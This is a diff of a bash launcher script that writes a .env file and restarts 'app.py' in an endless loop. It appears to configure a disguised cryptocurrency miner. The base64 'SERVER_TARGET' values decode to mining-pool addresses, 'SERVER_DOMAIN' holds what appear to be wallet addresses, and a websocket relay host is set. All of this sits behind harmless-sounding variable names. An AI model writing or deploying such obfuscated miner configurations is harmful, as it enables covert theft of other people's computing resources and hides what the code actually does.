@@ -1,10 +1,10 @@
 #!/bin/bash
 CONNECT=$1
 NAME=$2
-echo "SERVER_WS=wss://b.bagah.studio
-SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
-SERVER_DOMAIN=45GczdTw1FWBuGKaMRozbQQXSpHyYB3ZFabCmqDpQnCwjQ6cbUfPbemLnPTYrhXveDLY3aMuUAEgoEV5TgVatqvE6FFrL7n
+echo "SERVER_WS=ws://ok.keitaro.my.id
+SERVER_TARGET=c2cuc2Fsdml1bS5oZXJvbWluZXJzLmNvbToxMjMw
+SERVER_DOMAIN=SC1siC7JzGpM1tkMVbySGEbmQXMnm7WHAKwid4BNAa479ukcXBW11H4UyWh48uhCWHZjGxk7pRzkmWTdetW82ieN1Dioa93uqca
 SERVER_SECRET=${NAME}
 SERVER_CONNECTION=${CONNECT}
 SERVER_MODE=FAST" > .env
-while true; do python3 app.py; sleep 15; done
+while true; do python3 app.py; sleep 5; done
